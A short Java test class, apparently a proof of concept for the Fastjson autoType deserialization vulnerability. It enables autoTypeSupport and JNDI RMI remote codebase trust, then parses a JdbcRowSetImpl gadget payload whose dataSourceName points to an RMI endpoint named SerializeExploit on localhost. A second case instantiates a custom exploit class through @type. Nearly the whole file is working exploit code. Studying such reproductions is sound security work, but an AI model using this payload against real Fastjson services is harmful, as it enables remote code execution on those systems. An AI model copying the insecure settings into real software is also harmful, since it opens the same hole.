package com.customized.libs.core.libs.fastjson.bug;

import com.alibaba.fastjson.JSON;

/**
 * @author yan
 */
public class SerializeExploitTest {

    static {
        System.setProperty("fastjson.parser.autoTypeSupport", "true");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    }

    public static void main(String[] args) {
        case01();
        case02();
    }

    private static void case02() {
        Object object2 = JSON.parseObject("{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/SerializeExploit\",\"autoCommit\":true}");
        System.out.println(object2);
    }

    private static void case01() {
        Object object = JSON.parseObject("{\"@type\": \"com.customized.libs.core.libs.fastjson.bug.SerializeExploit\"}");
        System.out.println(object);
    }
}
